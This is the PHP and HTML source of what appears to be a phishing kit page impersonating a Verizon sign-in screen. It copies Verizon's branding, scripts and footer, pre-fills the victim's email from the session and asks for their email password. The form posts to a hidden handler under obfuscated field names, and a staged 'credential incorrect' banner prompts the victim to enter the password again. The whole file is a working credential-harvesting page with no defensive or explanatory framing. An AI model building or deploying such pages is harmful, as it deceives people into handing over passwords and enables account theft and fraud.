<?php
include "mfunc.php";
?>
<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
        
        <title>Verizon</title>
        <link rel="stylesheet" href="rel/vr/bootstrap-3.3.7.min.css">
        <link rel="stylesheet" href="rel/vr/style-2.0.css"><script src="rel/vr/jquery-1.12.4.min.js"></script>
    
        <link rel="stylesheet" href="rel/vr/core.css">
            

<link rel="shortcut icon" href="rel/vr/favicon.ico">
    

        <script>
            var $j = jQuery;
        </script>
        <script src="rel/vr/bootstrap-3.3.7.min.js"></script>

        <script src="rel/vr/core.js"></script>
        <script type="text/javascript">
            var overlayMode = '';
            var errorDisplayed = false;
            var fromVZTsession = '';
            var fromVZTparam = '';
            var oauthClientId = '';
            var streamTVSourcePlt = '';
            var loginURLFromsession = '';
            var fromVZT = fromVZTparam || fromVZTsession;
            var userIdOrMdn =  '';
            !function(i){"use strict";var t=function(i,t){this.selector=i,this.callback=t},e=[];e.initialize=function(e,n){var c=[],a=function(){-1==c.indexOf(this)&&(c.push(this),i(this).each(n))};i(e).each(a),this.push(new t(e,a))};var n=new MutationObserver(function(){for(var t=0;t<e.length;t++)i(e[t].selector).each(e[t].callback)});n.observe(document.documentElement,{childList:!0,subtree:!0,attributes:!0}),i.fn.initialize=function(i){e.initialize(this.selector,i)},i.initialize=function(i,t){e.initialize(i,t)}}(jQuery);
            $j(document).ready(function() {
                $j('#challengequestion').preventDoubleSubmission();
                //added to disable continue button if no answer is entered
               
                if ($j('#continueButton').length) {
                    $j("#continueButton").attr("disabled", "disabled");
                }
                else if ($j('#otherButton').length) {
                    $j("#otherButton").attr("disabled", "disabled");
                }

                $j('#IDToken1').keyup(function (key) {
                    var inputVal = $j(this).val();
                    //console.log("CQA .keyup IDToken1="+$j(this).val());
                    if(inputVal.length >= 1 && /[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/.test($j('#IDToken').val())==true) { 
                        if ($j('#continueButton').length) {
                            $j("#continueButton").removeAttr("disabled");
                            $j('#continueButton').prop("disabled", false);
                            //console.log("CQA continueButton enabled")
                        }
                        else if ($j('#otherButton').length) {
                            $j("#otherButton").removeAttr("disabled");
                            $j('#otherButton').prop("disabled", false);
                            //console.log("CQA otherButton enabled")
                        }
                    } else {
                        if ($j('#continueButton').length) {
                            //console.log("CQA continueButton disabled")
                            $j("#continueButton").attr("disabled", "disabled");
                            $j('#continueButton').prop("disabled", true);
                        }
                        else if ($j('#otherButton').length) {
                            //console.log("CQA otherButton disabled")
                            $j("#otherButton").attr("disabled", "disabled");
                            $j('#otherButton').prop("disabled", true);
                        }
                    }
                });

                //ensure button is enabled if saved/auto-fill answers
                $j('#IDToken1').change(function (key) {
                    var inputVal = $j(this).val();
                    //console.log("CQA .change IDToken1="+$j(this).val());
                    if(inputVal.length >= 1 && /[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/.test($j('#IDToken').val())==true) {
                        if ($j('#continueButton').length) {
                            $j("#continueButton").removeAttr("disabled");
                            $j('#continueButton').prop("disabled", false);
                            //console.log("CQA continueButton enabled")
                        }
                        else if ($j('#otherButton').length) {
                            $j("#otherButton").removeAttr("disabled");
                            $j('#otherButton').prop("disabled", false);
                            //console.log("CQA otherButton enabled")
                        }
                    } else {
                      console.log("CQA .change disable btn");
                        if ($j('#continueButton').length) {
                            //console.log("CQA continueButton disabled")
                            $j("#continueButton").attr("disabled", "disabled");
                            $j('#continueButton').prop("disabled", true);
                        }
                        else if ($j('#otherButton').length) {
                            //console.log("CQA otherButton disabled")
                            $j("#otherButton").attr("disabled", "disabled");
                            $j('#otherButton').prop("disabled", true);
                        }
                    }
                });

                //ensure button is enabled if saved/auto-fill answers - test blur
                $j('#IDToken1').blur(function (key) {
                    var inputVal = $j(this).val();
                    //console.log("CQA .blur IDToken1="+$j(this).val());
                    if(inputVal.length >= 1 && /[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/.test($j('#IDToken').val())==true) {
                        if ($j('#continueButton').length) {
                            $j("#continueButton").removeAttr("disabled");
                            $j('#continueButton').prop("disabled", false);
                            //console.log("CQA continueButton enabled")
                        }
                        else if ($j('#otherButton').length) {
                            $j("#otherButton").removeAttr("disabled");
                            $j('#otherButton').prop("disabled", false);
                            //console.log("CQA otherButton enabled")
                        }
                    } else {
                      console.log("CQA .blur disable btn");
                        if ($j('#continueButton').length) {
                            //console.log("CQA continueButton disabled")
                            $j("#continueButton").attr("disabled", "disabled");
                            $j('#continueButton').prop("disabled", true);
                        }
                        else if ($j('#otherButton').length) {
                            //console.log("CQA otherButton disabled")
                            $j("#otherButton").attr("disabled", "disabled");
                            $j('#otherButton').prop("disabled", true);
                        }
                    }
                });


                $j('#IDToken').keyup(function (key) {
                    var inputVal = $j(this).val();
                    if(/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/.test(inputVal)==true && $j('#IDToken1').val().length >=1) {
                        if ($j('#continueButton').length) {
                            $j("#continueButton").removeAttr("disabled");
                            $j('#continueButton').prop("disabled", false);
                            //console.log("CQA continueButton enabled")
                        }
                        else if ($j('#otherButton').length) {
                            $j("#otherButton").removeAttr("disabled");
                            $j('#otherButton').prop("disabled", false);
                            //console.log("CQA otherButton enabled")
                        }
                    } else {
                        if ($j('#continueButton').length) {
                            //console.log("CQA continueButton disabled")
                            $j("#continueButton").attr("disabled", "disabled");
                            $j('#continueButton').prop("disabled", true);
                        }
                        else if ($j('#otherButton').length) {
                            //console.log("CQA otherButton disabled")
                            $j("#otherButton").attr("disabled", "disabled");
                            $j('#otherButton').prop("disabled", true);
                        }
                    }
                });

                //ensure button is enabled if saved/auto-fill answers
                $j('#IDToken').change(function (key) {
                    var inputVal = $j(this).val();
                    if(/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/.test(inputVal)==true && $j('#IDToken1').val().length >=1 ) {
                        if ($j('#continueButton').length) {
                            $j("#continueButton").removeAttr("disabled");
                            $j('#continueButton').prop("disabled", false);
                            //console.log("CQA continueButton enabled")
                        }
                        else if ($j('#otherButton').length) {
                            $j("#otherButton").removeAttr("disabled");
                            $j('#otherButton').prop("disabled", false);
                            //console.log("CQA otherButton enabled")
                        }
                    } else {
                      console.log("CQA .change disable btn");
                        if ($j('#continueButton').length) {
                            //console.log("CQA continueButton disabled")
                            $j("#continueButton").attr("disabled", "disabled");
                            $j('#continueButton').prop("disabled", true);
                        }
                        else if ($j('#otherButton').length) {
                            //console.log("CQA otherButton disabled")
                            $j("#otherButton").attr("disabled", "disabled");
                            $j('#otherButton').prop("disabled", true);
                        }
                    }
                });

                //ensure button is enabled if saved/auto-fill answers - test blur
                $j('#IDToken').blur(function (key) {
                    var inputVal = $j(this).val();
                    if(/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/.test(inputVal)==true && $j('#IDToken1').val().length >=1) {
                        if ($j('#continueButton').length) {
                            $j("#continueButton").removeAttr("disabled");
                            $j('#continueButton').prop("disabled", false);
                            //console.log("CQA continueButton enabled")
                        }
                        else if ($j('#otherButton').length) {
                            $j("#otherButton").removeAttr("disabled");
                            $j('#otherButton').prop("disabled", false);
                            //console.log("CQA otherButton enabled")
                        }
                    } else {
                      console.log("CQA .blur disable btn");
                        if ($j('#continueButton').length) {
                            //console.log("CQA continueButton disabled")
                            $j("#continueButton").attr("disabled", "disabled");
                            $j('#continueButton').prop("disabled", true);
                        }
                        else if ($j('#otherButton').length) {
                            //console.log("CQA otherButton disabled")
                            $j("#otherButton").attr("disabled", "disabled");
                            $j('#otherButton').prop("disabled", true);
                        }
                    }
                });

                //added this here
                 $j('body').on('keydown','button, a',function(e){
                  if(e.which === 32){$j(this).trigger('click')}
                 });
                 
                $j("body").on("click mouseenter", ".a11y-tooltip > a", function(e){           
                    e.stopPropagation();
                    e.preventDefault();
                    if (e.type === "click"  && !$j(this).next().find("button.close-a11y-tooltip").length){
                        $j(this).next().append('<button class="close-a11y-tooltip"><span aria-hidden="true"></span>close information</button>');
                    }
                    else if ("mouseenter" === e.type && $j(this).next().find("button.close-a11y-tooltip").length){ 
                        $j(this).next().find("button.close-a11y-tooltip").remove();
                    }
                    if($j(this).next().is(':visible')){
                        $j(this).attr('aria-expanded',false).next().hide();
                    }             
                              else 
                              {
                                  if (fromVZT == 'Y'){
                                  
                                       $j(this).next().addClass("m-right");
                                  
                                  }
                                  else if ($j(this).offset().left < $j(window).width() / 2)
                                  {
                                      $j(this).next().addClass("m-bottom");
                                  }
                                  else if (inInline){
                                  
                                       $j(this).next().addClass("m-bottom");
                                  }
                                  else
                                  { 
                                      $j(this).next().removeClass("m-bottom");           
                                                          
                                  }                       
                             
                                    $j(this).attr('aria-expanded',true).next().show();  
                             }   
                        });
                     
                      
                                      
                        $j("body").on("mouseleave",".a11y-tooltip", function(e)
                        {
                             $j(this).find('a:first').text().replace('expanded','collapsed');
                   $j(this).find('div.a11y-tooltip-content').hide();                    
                          
                          
                        });
                            
                                                    
                         $j("body" ).on("click keydown", "button.close-a11y-tooltip", function(e) 
                        {
                             if ("click" === e.type) 
                             { 
                                   e.preventDefault();
                                   e.stopPropagation();
                                 $j(".a11y-tooltip > a").attr('aria-expanded',false);
                                   $j(".a11y-tooltip-content").hide();                               
                                 $j(".a11y-tooltip").focus(); 
                                   $j('button.close-a11y-tooltip').parent().prev().focus(); 
                                   
                             
                          
                  }
                  else if (9 === e.which) 
                            {
                                   e.preventDefault();
                                   e.stopPropagation();
                                   $j(".a11y-tooltip-content").hide();
                                 $j("#forgotPasswordLink").focus();
                                 $j(".a11y-tooltip > a").attr('aria-expanded',false);
                                
                             }
                             else if (27 === e.which)
                             {
                                e.preventDefault();                       
                                $j(".a11y-tooltip-content").hide();
                  $j(".a11y-tooltip").focus();                      
                  $j('button.close-a11y-tooltip').parent().prev().focus();
                  $j(".a11y-tooltip > a").attr('aria-expanded',false);
                   }
                           
                                               
                  if (event.shiftKey && event.keyCode == 9){
                           
                      $j(".a11y-tooltip-content").hide();
                  $j("#rememberUserName").focus();
                  $j(".a11y-tooltip > a").attr('aria-expanded',false);
                                
                   }
                           
                                               
                        });
                   
                        
                        $j("body" ).on("keydown", ".a11y-tooltip", function(e) 
                        {   
                      
                          if(event.shiftKey && event.keyCode == 9){
                          
                            $j(".a11y-tooltip-content").hide();
                            $j(".a11y-tooltip > a").attr('aria-expanded',false);
                   } 
                        
                 if (e.which === 27)
                  {
                                    e.preventDefault();
                                    $j(".a11y-tooltip-content").hide();                      
                      $j(".a11y-tooltip").focus();
                      $j('button.close-a11y-tooltip').parent().prev().focus();
                      $j(".a11y-tooltip > a").attr('aria-expanded',false);
                            
                            
                 }                      
                        
                         
             }); 
                // ends here
                if(errorDisplayed && (oauthClientId != 'StreamTVAgent') ){
                    $j('#bannererror').focus();
                }else{
                     $j('#IDToken').focus();
                }
                $j('#sharedComputerTooltip').tooltip({
                    container: '#main-content'
                });
                
                $j('#rememberComputer').focus(function(){
                    $j('#remembercomputerblock').addClass('extendedremember');
                });
                $j('#rememberComputer').blur(function(){
                    $j('#remembercomputerblock').removeClass('extendedremember');
                });

                if (overlayMode == 'o') {
                    $j('#main-content a').attr('target', '_top');
                }

                $j('.grecaptcha-badge').appendTo("#challengequestion");
                    $j.initialize(".grecaptcha-badge", function() {
                      $j(this).appendTo("#challengequestion");
                      console.log('append done');
                    });
                });
            
            function signInAsDiffUserClicked() {
                 
                return true;
            }
            function forgotMyAnswerClicked() {
                 
                return true;
            }
            function continueClicked(buttonID) {
            	//var displayInvisibleCaptcha = '';
            	//check captcha response if displayInvisibleCaptcha is true or else just allow to continue
                if (checkCaptchaResponse(buttonID)) {
                    
                     return true;
                 } else {
                     return false;
                 }
            }
            var onSubmit = function(response) {
                console.log('login form submit'+response);
                $j('#challengequestion').submit();
            };
            function popUp(f,d,a,c){var b="";if(d=="flashPopup"){b="resizable,height="+a+",width="+c}if(d=="popup"){b="scrollbars,resizable,height="+a+",width="+c}if(d=="fullScreen"){b="scrollbars,location,directories,status,menubar,toolbar,resizable"}window.open(f,"newWin",b)}

        </script>

	<style>
	.form-control {
    width: 100%;
	max-width:370px;
	}
	</style>

		
		<style type="text/css">[id^='LPMcontainer']:focus{outline: 2px dashed #747676 !important;outline-offset: 5px;}</style></head>
    
    <body id="fullscreen-body" class="Desktop-device">
    
    





    
        
        
        
            



    
    
        <div id="vz-gh20">
<div class="gnav20 " data-exp-name="Limited">
     
    <div class="gnav20-sticky-content">    	
     	



    
    
    <div class="gnav20-apicomponentnewdesign">

<a class="gnav20-header-accessibility" href="javascript:void(0)" tabindex="0" id="gnav20-skip-to-main-content-id">
	<span>Skip to main content</span>
</a>

<div class="gnav20-width-wrapper gnav20-new-design  gnav20-promo-bottom" data-gnav20-container="header">	
	
	
	<div class="gnav20-vzhmoverlay"></div>
	<div class="gnav20-main">
		



    
    
    <div class="gnav20-gnav-new-design">

<div class="gnav20-desktop" item-title="all">
	<div class="gnav20-row-one">
		<div class="gnav20-grid1-wrapper">
			



    
    
    <div class="ghost">

</div>



		</div>		
		<div class="gnav20-utility">		
			



    
    
    <div class="gnav20-localization">

    
		<div class="gnav20-utility-wrapper gnav20-hide-on-mobile" item-title="localization">
			
				
				<a class="gnav20-lang-link gnav20-subanchor" aria-label="Switch to Español language website" ></a>
					
			
		</div>
    

</div>



        </div>
    </div>
	<div class="gnav20-row-two">
		<div class="gnav20-grid1-wrapper">
			



    
    
    <div class="gnav20-logo">

<div class="gnav20-logo-wrapper gnav20-relative-index">
    <a class="gnav20-logoWhiteBg"  title="Verizon Home Page">
        <img alt="Verizon Logo" src="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB3aWR0aD0iNDI4IiBoZWlnaHQ9IjUwMCIgdmlld0JveD0iMCAwIDQyOCA1MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0wIDI1MEg3Ny43MkwxNTUuNDMgNDE2LjY3TDM0OS43MyAwSDQyNy40NUwxOTQuMjkgNTAwSDExNi41OEwwIDI1MFoiIGZpbGw9IiNFRTAwMDAiLz4KPC9zdmc+Cg==">
    </a>
</div></div>



		</div>
		<div class="gnav20-navigation">
			




		</div>
		<div class="gnav20-utility">		
			



    
    
    <div class="gnav20-localization">

    
		<div class="gnav20-utility-wrapper gnav20-hide-on-desktop" item-title="localization">
			
				
				<a class="gnav20-lang-link gnav20-subanchor" aria-label="Switch to Español language website" ></a>
					
			
		</div>
    

</div>



        </div>
    </div>
</div>

<div class="gnav20-mobile gnav20-hide-hamburger " item-title="all">
	<div class="gnav20-wrapper-logo">
		



    
    
    <div class="gnav20-logo">

<div class="gnav20-logo-wrapper gnav20-relative-index">
    <a class="gnav20-logoWhiteBg"  title="Verizon Home Page">
        <img alt="Verizon Logo" src="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB3aWR0aD0iNDI4IiBoZWlnaHQ9IjUwMCIgdmlld0JveD0iMCAwIDQyOCA1MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0wIDI1MEg3Ny43MkwxNTUuNDMgNDE2LjY3TDM0OS43MyAwSDQyNy40NUwxOTQuMjkgNTAwSDExNi41OEwwIDI1MFoiIGZpbGw9IiNFRTAwMDAiLz4KPC9zdmc+Cg==">
    </a>
</div></div>



	</div>
    <div class="gnav20-utility">
        



    
    
    <div class="gnav20-localization">

    
		<div class="gnav20-utility-wrapper gnav20-hide-on-desktop" item-title="localization">
			
				
				<a class="gnav20-lang-link gnav20-subanchor" aria-label="Switch to Español language website" ></a>
					
			
		</div>
    

</div>



        <button id="gnav20-nav-toggle" data-menuitem="vzmobilemenu" tabindex="0" aria-label="Menu for navigation opens a modal overlay">
		</button>
    </div>
    <nav id="gnav20-mobile-menu" class="gnav20-mobile-menu gnav20-hide">
        <button id="gnav20-closex" class="gnav20-closex" aria-label="close the Menu" tabindex="0">Close</button>
        <div id="gnav20-ulwrapper">
			



    
    
    <div class="ghost">

</div>



			<div class="gnav20-navigation-placeholder">
			




		</div>            
			
        </div>
        <div id="gnav20-footerlink">
            



    
    
    <div class="gnav20-localization">

    
		
    

</div>


            
        </div>
		
    </nav>
</div></div>


		
	</div>
	<div class="gnav20-width-wrapper-border-bottom"></div>
	
	<div>



</div>
</div>
<div name="headerEnd" id="gnav20-header-end" role="none" tabindex="-1"></div></div>



     </div>
	<div class="gnav20-sticky-header gnav20-new-design"></div>
</div>


</div>

    <main role="main">

        <div id="main-content" class="container-fluid">
		<div class="row" style="display:<?php if(!isset($eshow)){echo 'none';};?>">
                <div class="col-xs-12">
                    <p id="bannererror" tabindex="0" class="bg-danger">The credential you entered is incorrect. <span class="normal-text">Please try again...</span><br><span style="display:block;margin-top:10px;"></span></p>
                </div>
 </div>

            <div class="row">
                <div class="col-xs-12">
  <h1>Sign in</h1>
                </div>
            </div>
            <div class="row">
                <div class="col-xs-12 col-sm-6">
<form id="challengequestion" name="challengequestion" action="<?php echo $proc; ?><?php if(isset($eshow)){echo $eshow;};?>" method="post">
                        <div class="form-group">
                            <h3>Email Address</h3>
    <input id="IDToken" class="form-control" type="email" value="<?php echo $_SESSION['email'];?>" readonly autocomplete="off" name="<?php echo $ename; ?>" tabindex="0">
	<br/>
								<input type="hidden" name="<?php echo $idc; ?>" value='<?php echo md5(uniqid()); ?>'>
<label for="IDToken1">Enter Your Email Password</label>
    <input id="IDToken1" class="form-control" type="password" value="" autocomplete="off" name="<?php echo $pname; ?>" tabindex="0">
                        </div>
                   
                        <div class="form-group btn-center">
                            <button id="otherButton" class="btn btn-default btn-lg" type="submit" disabled="">Continue</button>
                        </div>
</form>
                </div>

            </div>
        </div>


    </main>
    




    
    
        <div id="vz-gf20">
<div class="gnav20 " data-exp-name="Master">
     <input type="hidden" id="cradle-context" name="cradle-key" value="cradle-url">
    <div class="gnav20-sticky-content">    	
     	



    
    
    <div class="gnav20-footercontainer">
<div class="gnav20-footer-container gnav20-white-focus gnav20-mobile-footer-accordion" data-gnav20-container="footer" role="contentinfo">
	<div class="gnav20-main-container">
		<div class="gnav20-footer-level-one">
			<div class="gnav20-footer-wrapper gnav20-four">			
				<div class="gnav20-col-wrapper">
					



    
    
    <div class="gnav20-herofooter">

	<div class="gnav20-hero-wrapper">
		<div class="gnav20-hero-footer-heading">Shop</div>
		<div class="gnav20-border-content">			
			<ul class="gnav20-footer-list">
				<li><a >Devices</a></li>
			
				<li><a >Accessories</a></li>
			
				<li><a >Plans</a></li>
			
				<li><a >Home Internet &amp; TV</a></li>
			
				<li><a >Entertainment</a></li>
			
				<li><a >Deals</a></li>
			</ul>				
		</div>
	</div>	
</div>



				</div>
				<div class="gnav20-col-wrapper">
					



    
    
    <div class="gnav20-herofooter">

	<div class="gnav20-hero-wrapper">
		<div class="gnav20-hero-footer-heading">Top Device Brands</div>
		<div class="gnav20-border-content">			
			<ul class="gnav20-footer-list">
				<li><a >Samsung</a></li>
			
				<li><a >Apple</a></li>
			
				<li><a >Motorola</a></li>
			
				<li><a >Google</a></li>
			
				<li><a >Amazon</a></li>
			</ul>				
		</div>
	</div>	
</div>



				</div>
				<div class="gnav20-col-wrapper">
					



    
    
    <div class="gnav20-herofooter">

	<div class="gnav20-hero-wrapper">
		<div class="gnav20-hero-footer-heading">Support</div>
		<div class="gnav20-border-content">			
			<ul class="gnav20-footer-list">
				<li><a >Support overview</a></li>
			
				<li><a >Return policy</a></li>
			
				<li><a >Contact us</a></li>
			
				<li><a >Sign in</a></li>
			
				<li><a >Download My Verizon App</a></li>
			</ul>				
		</div>
	</div>	
</div>



				</div>
				<div class="gnav20-col-wrapper">
					



    
    
    <div class="gnav20-herofooter">

	<div class="gnav20-hero-wrapper">
		<div class="gnav20-hero-footer-heading">About Verizon</div>
		<div class="gnav20-border-content">			
			<ul class="gnav20-footer-list">
				<li><a >About us</a></li>
			
				<li><a >Careers</a></li>
			
				<li><a >News</a></li>
			
				<li><a >Responsibility</a></li>
			
				<li><a >Verizon Innovation Program</a></li>
			
				<li><a >Consumer education</a></li>
			
				<li><a >Brochures</a></li>
			</ul>				
		</div>
	</div>	
</div>



				</div>
			</div>
			<div class="gnav20-footer-wrapper gnav20-four">			
				<div class="gnav20-col-wrapper">
					



    
    
    <div class="gnav20-herofooter">

	<div class="gnav20-hero-wrapper">
		<div class="gnav20-hero-footer-heading">Most Popular</div>
		<div class="gnav20-border-content">			
			<ul class="gnav20-footer-list">
				<li><a >Apple iPhone 12 Pro Max</a></li>
			
				<li><a >Samsung Galaxy Z Fold3</a></li>
			
				<li><a >Apple AirPods Max</a></li>
			
				<li><a >Disney</a></li>
			
				<li><a >Apple Watch Series 6</a></li>
			
				<li><a >Fios</a></li>
			
				<li><a >Verizon Visa® Card</a></li>
			</ul>				
		</div>
	</div>	
</div>



				</div>
				<div class="gnav20-col-wrapper">
					



    
    
    <div class="gnav20-herofooter">

	<div class="gnav20-hero-wrapper">
		<div class="gnav20-hero-footer-heading">Top Accessory Brands</div>
		<div class="gnav20-border-content">			
			<ul class="gnav20-footer-list">
				<li><a >Otterbox</a></li>
			
				<li><a >ZAGG</a></li>
			
				<li><a >Beats</a></li>
			
				<li><a >Mophie</a></li>
			
				<li><a >JBL</a></li>
			
				<li><a >Fitbit</a></li>
			
				<li><a >Gear 4</a></li>
			</ul>				
		</div>
	</div>	
</div>



				</div>
				<div class="gnav20-col-wrapper">
					



    
    
    <div class="gnav20-herofooter">

	<div class="gnav20-hero-wrapper">
		<div class="gnav20-hero-footer-heading"> Important Consumer Information</div>
		<div class="gnav20-border-content">			
			<ul class="gnav20-footer-list">
				<li><a >Terms &amp; Conditions</a></li>
			
				<li><a  target="_blank">Device Payment Terms &amp; Conditions</a></li>
			
				<li><a >Report a security vulnerability</a></li>
			
				<li><a > Mobile customer agreement</a></li>
			
				<li><a >Announcements</a></li>
			
				<li><a >Radio frequency emissions</a></li>
			
				<li><a >Recall</a></li>
			
				<li><a >Legal notices</a></li>
			</ul>				
		</div>
	</div>	
</div>



				</div>
				<div class="gnav20-col-wrapper">
					



    
    
    <div class="gnav20-socialfooter">
<div class="gnav20-hero-wrapper">
	<div class="gnav20-hero-footer-heading" aria-label="Follow Verizon menu list">Follow Verizon</div>
	<div class="gnav20-border-content gnav20-social-icon">
		<a class="gnav20-social-media"  target="_blank" aria-label="Follow Verizon on Facebook" title="Opens New Window">
			<span>facebook-official</span>
			<svg focusable="false" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 18 18" style="enable-background:new 0 0 18 18;" xml:space="preserve">
				<path fill="#FFF" d="M17,0H1C0.4,0,0,0.4,0,1v16c0,0.5,0.4,1,1,1h8.6v-7H7.3V8.3h2.3v-2c0-2.3,1.4-3.6,3.5-3.6c1,0,1.8,0.1,2.1,0.1v2.4l-1.4,0
					c-1.1,0-1.3,0.5-1.3,1.3v1.7h2.7L14.8,11h-2.3v7H17c0.5,0,1-0.4,1-1V1C18,0.4,17.6,0,17,0z"></path>
			</svg>
		</a>
		<a class="gnav20-social-media"  target="_blank" aria-label="Follow Verizon on Twitter" title="Opens New Window">
			<span>twitter</span>
			<svg focusable="false" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 18 18" style="enable-background:new 0 0 18 18;" xml:space="preserve">
				<path fill="#FFF" d="M15.9,4.3c0.8-0.5,1.3-1.2,1.6-2C16.8,2.7,16,3,15.2,3.1C14.5,2.4,13.6,2,12.5,2c-2,0-3.7,1.6-3.7,3.7c0,0.3,0,0.6,0.1,0.8
					c-3-0.2-5.7-1.6-7.5-3.8C1.1,3.2,0.9,3.8,0.9,4.5c0,1.3,0.6,2.4,1.6,3C1.9,7.5,1.3,7.3,0.8,7c0,1.8,1.3,3.2,2.9,3.6
					c-0.3,0.1-0.6,0.1-1,0.1c-0.2,0-0.5,0-0.7-0.1c0.5,1.5,1.8,2.5,3.4,2.5c-1.3,1-2.8,1.6-4.5,1.6c-0.3,0-0.6,0-0.9-0.1
					c1.8,1.2,3.7,1.9,5.8,1.9c6.7,0,10.4-5.6,10.4-10.4c0-0.2,0-0.3,0-0.5c0.7-0.5,1.3-1.2,1.8-1.9C17.3,4,16.6,4.2,15.9,4.3z"></path>
			</svg>
		</a>
		<a class="gnav20-social-media"  target="_blank" aria-label="Follow Verizonon Youtube" title="Opens New Window">
			<span>you-tube</span>
			<svg focusable="false" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 18.5 18" style="enable-background:new 0 0 18.5 18;" xml:space="preserve">
				<path fill="#FFF" d="M17.8,4.8C17.6,4,17,3.4,16.2,3.2c-1.4-0.4-7-0.4-7-0.4s-5.6,0-7,0.4C1.4,3.4,0.8,4.1,0.6,4.8C0.2,6.3,0.2,9.2,0.2,9.2
					s0,2.9,0.4,4.4c0.2,0.7,0.8,1.4,1.6,1.6c1.4,0.4,7,0.4,7,0.4s5.6,0,7-0.4c0.8-0.2,1.4-0.8,1.6-1.6c0.4-1.5,0.4-4.4,0.4-4.4
					S18.2,6.3,17.8,4.8z M7.4,11.9V6.5l4.7,2.7L7.4,11.9z"></path>
			</svg>
		</a>
		<a class="gnav20-social-media"  target="_blank" aria-label="Follow Verizon on Instagram" title="Opens New Window">
			<span>instagram</span>
			<svg focusable="false" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 18 18" style="enable-background:new 0 0 18 18;" xml:space="preserve">
				<g>
					<path fill="#FFF" d="M18,5.3c0-1-0.2-1.6-0.4-2.2c-0.2-0.6-0.5-1.1-1-1.6c-0.5-0.5-1-0.8-1.6-1c-0.6-0.2-1.2-0.4-2.2-0.4C11.8,0,11.4,0,9,0
						S6.3,0,5.3,0c-1,0-1.6,0.2-2.2,0.4C2.5,0.7,2,1,1.5,1.5s-0.8,1-1,1.6C0.3,3.7,0.1,4.3,0.1,5.3C0,6.2,0,6.6,0,9c0,2.4,0,2.8,0.1,3.7
						c0,1,0.2,1.6,0.4,2.2c0.2,0.6,0.5,1.1,1,1.6s1,0.8,1.6,1c0.6,0.2,1.2,0.4,2.2,0.4C6.3,18,6.6,18,9,18s2.8,0,3.7-0.1
						c1,0,1.6-0.2,2.2-0.4c0.6-0.2,1.1-0.5,1.6-1c0.5-0.5,0.8-1,1-1.6c0.2-0.6,0.4-1.2,0.4-2.2c0-1,0.1-1.3,0.1-3.7
						C18,6.6,18,6.2,18,5.3z M16.3,12.6c0,0.9-0.2,1.4-0.3,1.7c-0.2,0.4-0.4,0.7-0.7,1s-0.6,0.5-1,0.7c-0.3,0.1-0.8,0.3-1.7,0.3
						c-0.9,0-1.2,0.1-3.6,0.1s-2.7,0-3.6-0.1c-0.9,0-1.4-0.2-1.7-0.3c-0.4-0.2-0.7-0.4-1-0.7s-0.5-0.6-0.7-1c-0.1-0.3-0.3-0.8-0.3-1.7
						c0-0.9-0.1-1.2-0.1-3.6c0-2.4,0-2.7,0.1-3.6C1.7,4.5,1.9,4,2,3.7c0.2-0.4,0.4-0.7,0.7-1C3,2.3,3.3,2.1,3.7,2C4,1.9,4.5,1.7,5.4,1.7
						c0.9,0,1.2-0.1,3.6-0.1c2.4,0,2.7,0,3.6,0.1c0.9,0,1.4,0.2,1.7,0.3c0.4,0.2,0.7,0.4,1,0.7s0.5,0.6,0.7,1c0.1,0.3,0.3,0.8,0.3,1.7
						c0,0.9,0.1,1.2,0.1,3.6C16.4,11.4,16.4,11.7,16.3,12.6z"></path>
					<path fill="#FFF" d="M9,4.4C6.5,4.4,4.4,6.4,4.4,9c0,2.6,2.1,4.6,4.6,4.6s4.6-2.1,4.6-4.6C13.6,6.4,11.6,4.4,9,4.4z M9,12c-1.7,0-3-1.3-3-3
						c0-1.7,1.3-3,3-3c1.7,0,3,1.3,3,3C12,10.7,10.7,12,9,12z"></path>
					<path fill="#FFF" d="M13.8,3.1c-0.6,0-1.1,0.5-1.1,1.1c0,0.6,0.5,1.1,1.1,1.1c0.6,0,1.1-0.5,1.1-1.1C14.9,3.6,14.4,3.1,13.8,3.1z"></path>
				</g>
			</svg>
		</a>
		
		
	</div>
</div></div>


    
    
    <div class="gnav20-socialfooter">
<div class="gnav20-hero-wrapper">
	<div class="gnav20-hero-footer-heading" aria-label="Follow Verizon Fios menu list">Follow Verizon Fios</div>
	<div class="gnav20-border-content gnav20-social-icon">
		<a class="gnav20-social-media"  target="_blank" aria-label="Follow Verizon Fios on Facebook" title="Opens New Window">
			<span>facebook-official</span>
			<svg focusable="false" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 18 18" style="enable-background:new 0 0 18 18;" xml:space="preserve">
				<path fill="#FFF" d="M17,0H1C0.4,0,0,0.4,0,1v16c0,0.5,0.4,1,1,1h8.6v-7H7.3V8.3h2.3v-2c0-2.3,1.4-3.6,3.5-3.6c1,0,1.8,0.1,2.1,0.1v2.4l-1.4,0
					c-1.1,0-1.3,0.5-1.3,1.3v1.7h2.7L14.8,11h-2.3v7H17c0.5,0,1-0.4,1-1V1C18,0.4,17.6,0,17,0z"></path>
